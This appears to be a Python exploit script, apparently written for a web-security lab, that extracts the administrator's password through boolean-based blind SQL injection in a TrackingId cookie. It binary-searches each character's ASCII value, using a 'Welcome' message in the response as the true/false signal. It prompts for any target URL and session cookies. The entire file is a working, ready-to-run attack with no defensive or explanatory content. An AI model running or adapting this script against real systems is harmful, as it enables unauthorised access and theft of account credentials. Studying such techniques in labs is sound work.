import math
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def req(url, num, oper, pas, ck_trackid, ck_session):
    payload = "' and (select ascii(substring(password, %s, 1)) from users where username = 'administrator') %s '%s' -- " % (num, oper, pas)
    payload_encoded = urllib.parse.quote(payload)
    cookies = {"TrackingId": f"{ck_trackid}" + payload_encoded, "sessions": f"{ck_session}"}
    return requests.get(url, cookies = cookies, verify = False) 

def sqli_password(url, ck_trackid, ck_session):
    passwords = ""
    for i in range(1,21):
        first = 32
        last = 126
        while first <= last:
            middle = math.floor(first + (last-first)/2)
            if "Welcome" in req(url, i, '=', middle, ck_trackid, ck_session).text:
                passwords += chr(middle)
                sys.stdout.write("\r" + passwords)
                sys.stdout.flush
                break
            elif "Welcome" in req(url, i, '>', middle, ck_trackid, ck_session).text:
                sys.stdout.write("\r" + passwords + chr(middle))
                sys.stdout.flush
                first = middle + 1
            else:
                sys.stdout.write("\r" + passwords + chr(middle))
                sys.stdout.flush
                last = middle - 1
                

def main(): 
    url = input("Enter URl here:")
    ck_trackid = input("TrackingID cookie: ")
    ck_session = input("Session cookie: ")
    print("(+) Retrieving Passwords...")
    sqli_password(url, ck_trackid, ck_session)        

if __name__ == "__main__":
    main()